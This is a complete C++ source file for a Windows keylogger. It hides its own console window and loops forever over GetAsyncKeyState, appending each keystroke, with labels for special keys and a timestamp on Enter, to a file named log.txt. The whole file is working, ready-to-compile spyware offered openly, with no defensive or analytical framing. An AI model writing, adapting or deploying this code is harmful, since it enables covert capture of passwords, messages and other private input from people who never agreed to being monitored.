#include<iostream>
#include<stdio.h>
#include<windows.h>
#include<Winuser.h>
#include<stdlib.h>
#include<conio.h>
#include<time.h>
#include<unistd.h>

using namespace std;

int Save (int key, char *file);


int main()
{

    HWND window;
    AllocConsole();
    window=FindWindowA("ConsoleWindowClass",NULL);
    ShowWindow(window,0);

    char i;
    while(1){
       Sleep(1000);
       for(i=8;i<=190;i++){
          if(GetAsyncKeyState(i)==-32767){
             int ret = Save(i,"log.txt");
           }
        }
    }
    return 0;
}

int Save (int key,char *file){
    if((key==1)||(key==2))
          return 0;

       FILE *ptr;
       ptr=fopen(file,"a+");
      //cout<<key_stroke<<endl;  // just in case //if you require to show key-strokes.
    // You need to care about special characters. //Code below that will do it. :)
       if(key==8)
           fprintf(ptr,"%s","[BackSpace]");

       else if(key==13){
           time_t mytime;
           mytime = time(NULL);
           char* time = ctime(&mytime);
           fprintf(ptr,"%s\n%s\n","[Enter]",time);
       }
       else if(key==32)
           fprintf(ptr,"%s"," ");

       else if(key==VK_TAB)
           fprintf(ptr,"%s","[TAB]");

       else if(key==VK_SHIFT)
           fprintf(ptr,"%s","[SHIFT]");

       else if(key==VK_CONTROL)
           fprintf(ptr,"%s","[CONTROL]");

       else if(key==VK_ESCAPE){
           fprintf(ptr,"%s","[ESC]");
           return 99;
       }

       else if(key==VK_END)
           fprintf(ptr,"%s","[END]");

       else if(key==VK_HOME)
           fprintf(ptr,"%s","HOME");

       else if(key==VK_LEFT)
           fprintf(ptr,"%s","[LEFT]");

       else if(key==VK_UP)
           fprintf(ptr,"%s","[UP]");

       else if(key==VK_RIGHT)
           fprintf(ptr,"%s","[RIGHT]");

       else if(key==VK_DOWN)
           fprintf(ptr,"%s","[DOWN]");

       else if(key==190 || key==110)
           fprintf(ptr,"%s","[Dot]");

       else
           fprintf(ptr,"%s",&key);
       fclose(ptr);

       return 0;
}
